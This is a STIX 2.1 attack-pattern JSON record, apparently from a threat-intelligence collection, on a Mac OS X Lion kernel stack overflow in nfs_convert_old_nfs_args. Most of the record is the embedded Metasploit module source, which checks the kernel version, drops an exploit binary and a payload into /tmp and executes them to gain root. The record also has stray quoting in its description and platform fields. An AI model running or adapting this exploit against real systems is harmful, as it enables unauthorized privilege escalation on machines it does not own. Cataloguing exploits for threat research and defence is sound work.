{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7b3f4323-9810-475a-a5a3-08b97b7bc0db",
    "created": "2024-08-14T16:34:52.799709Z",
    "modified": "2024-08-14T16:34:52.799713Z",
    "name": "Mac OS X NFS Mount Privilege Escalation Exploit",
    "description": " This exploit leverages a stack buffer overflow vulnerability to escalate privileges. The vulnerable function nfs_convert_old_nfs_args does not verify the size of a user-provided argument before copying it to the stack. As a result, by passing a large size as an argument, a local user can overwrite the stack with arbitrary content.  Mac OS X Lion Kernel <= xnu-1699.32.7 except xnu-1699.24.8 are affected.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/nfs_mount_root.rb",
            "external_id": "nfs_mount_root.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Mac OS X NFS Mount Privilege Escalation Exploit',\n      'Description'   => %q{\n        This exploit leverages a stack buffer overflow vulnerability to escalate privileges.\n        The vulnerable function nfs_convert_old_nfs_args does not verify the size\n        of a user-provided argument before copying it to the stack. As a result, by\n        passing a large size as an argument, a local user can overwrite the stack with arbitrary\n        content.\n\n        Mac OS X Lion Kernel <= xnu-1699.32.7 except xnu-1699.24.8 are affected.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Kenzley Alphonse', # discovery and a very well-written exploit\n          'joev' # msf module\n        ],\n      'References'    =>\n        [\n          [ 'EDB', '32813' ]\n        ],\n      'Platform'      => 'osx',\n      'Arch'          => [ ARCH_X64 ],\n      'SessionTypes'  => [ 'shell', 'meterpreter' ],\n      'Targets'       => [\n        [ 'Mac OS X 10.7 Lion x64 (Native Payload)',\n          {\n            'Platform' => 'osx',\n            'Arch' => ARCH_X64\n          }\n        ]\n      ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2014-04-11'\n    ))\n  end\n\n  def check\n    if ver_lt(xnu_ver, \"1699.32.7\") and xnu_ver.strip != \"1699.24.8\"\n      CheckCode::Appears\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    if check != CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    osx_path = File.join(Msf::Config.install_root, 'data', 'exploits', 'osx')\n    file = File.join(osx_path, 'nfs_mount_priv_escalation.bin')\n    exploit = File.read(file)\n    pload   = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n    tmpfile = \"/tmp/#{Rex::Text::rand_text_alpha_lower(12)}\"\n    payloadfile = \"/tmp/#{Rex::Text::rand_text_alpha_lower(12)}\"\n\n    print_status \"Writing temp file as '#{tmpfile}'\"\n    write_file(tmpfile, exploit)\n    register_file_for_cleanup(tmpfile)\n\n    print_status \"Writing payload file as '#{payloadfile}'\"\n    write_file(payloadfile, pload)\n    register_file_for_cleanup(payloadfile)\n\n    print_status \"Executing payload...\"\n    cmd_exec(\"chmod +x #{tmpfile}\")\n    cmd_exec(\"chmod +x #{payloadfile}\")\n    cmd_exec(\"#{tmpfile} #{payloadfile}\")\n  end\n\n  def xnu_ver\n    m = cmd_exec(\"uname -a\").match(/xnu-([0-9\\.~]*)/)\n    m && m[1]\n  end\n\n  def ver_lt(a, b)\n    Rex::Version.new(a.gsub(/~.*?$/,'')) < Rex::Version.new(b.gsub(/~.*?$/,''))\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-11",
    "x_mitre_platforms": [
        "osx'"
    ]
}